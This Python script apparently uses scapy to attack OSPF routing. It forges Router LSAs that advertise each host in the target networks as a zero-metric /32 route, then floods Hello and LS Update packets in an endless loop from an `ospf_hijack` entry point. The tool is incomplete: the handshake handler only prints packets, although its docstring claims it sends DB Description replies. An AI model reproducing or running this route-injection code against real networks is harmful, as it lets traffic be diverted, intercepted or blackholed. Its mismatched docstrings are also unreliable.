"""
Documentation for scapy OSPF:
https://scapy.readthedocs.io/en/latest/api/scapy.contrib.ospf.html
"""

from time import sleep
from scapy.contrib.ospf import *
from scapy.all import *
from netaddr import IPNetwork
from threading import Thread

# Only transit should be used in this tool. This dictionary just gives the numbers meaning
OSPF_Router_LSA_types = {
  "p2p": 1,
  "transit": 2,
  "stub": 3,
  "virtual": 4
}

MY_IP = IP().src
ADVERTISE_IP = '127.0.0.1'

# FOR TESTING
TEST_NETWORKS = [
  '192.168.1.0/24'
]


def generate_lsa_list(networks: List[str], src_ip=MY_IP, metric=0):
  """
  Given a list of networks specified in CIDR notation, generate OSPF_Router_LSA packets.
  Every host in each specified network will be advertised individually with /32 prefix.

  Parameters
  -----------
  networks: List[str]
    List of network addresses in CIDR notation
  """
  lsalist = []
  for network in networks:
    ip_range = IPNetwork(network)
    for ip_addr in ip_range.iter_hosts():
      lsalist.append(
        OSPF_Router_LSA(id=src_ip, adrouter=src_ip, linklist=[
          OSPF_Link(id=ip_addr, data='255.255.255.255',
                    metric=metric,
                    type=OSPF_Router_LSA_types['transit'])
          ])
      )

  return lsalist


def spam_hello_and_advertisements(*, networks: List[str], interval=0.5):
  """
  Given a list of network addresses specified in CIDR notation,
  flood those networks with OSPF Hello packets and LSA updates.

  Parameters
  -----------
  networks: List[str]
    List of network addresses in CIDR notation

  interval: number
    Interval in seconds to spam packets
  """

  lsalist = generate_lsa_list(networks)

  print('Spamming hello and LSUpdate packets.')
  while True:
    hello_packet = IP(dst=ADVERTISE_IP) / OSPF_Hdr(src=MY_IP) / OSPF_Hello()
    send(hello_packet, verbose=False)

    update_packet = IP(dst=ADVERTISE_IP) / \
      OSPF_Hdr(src=MY_IP) / OSPF_LSUpd(lsalist=lsalist)
    send(update_packet, verbose=False)

    sleep(interval)


def handle_ospf_handshake():
  """
  Sniffs for OSPF packets, replying to Hello Packets with a DB Description packet.
  """
  def handle(packet: Packet):
    if 'OSPF' in packet:
      print(packet)

  sniff(prn=handle)


def ospf_hijack(*, networks: List[str]):
  """
  Given a list of network addresses specified in CIDR notation,
  flood those networks with OSPF Hello packets and LSA updates.

  Parameters
  -----------
  networks: List[str]
    List of network addresses in CIDR notation
  """
  spam_hellos_thread = Thread(
    target=spam_hello_and_advertisements,
    daemon=True,
    kwargs={"networks": networks}
  )
  spam_hellos_thread.start()

  ospf_sniff_thread = Thread(
    target=handle_ospf_handshake,
    daemon=True
  )

  ospf_sniff_thread.start()

  # Keep the script running until Ctrl+C is pressed
  while True:
    sleep(1)


def test_send_dbd():
  hello_packet = IP(src='127.0.0.1') / OSPF_Hdr(src='127.0.0.1') / OSPF_Hello()
  dbd_packet = IP(dst=hello_packet.src) / \
    OSPF_Hdr(src=IP().src, type=2) / \
    OSPF_DBDesc(options=0x52, dbdescr=0x07) / \
    OSPF_LLS_Hdr()
  send(dbd_packet)

if __name__ == '__main__':
  test_send_dbd()
  # ospf_hijack(networks=TEST_NETWORKS)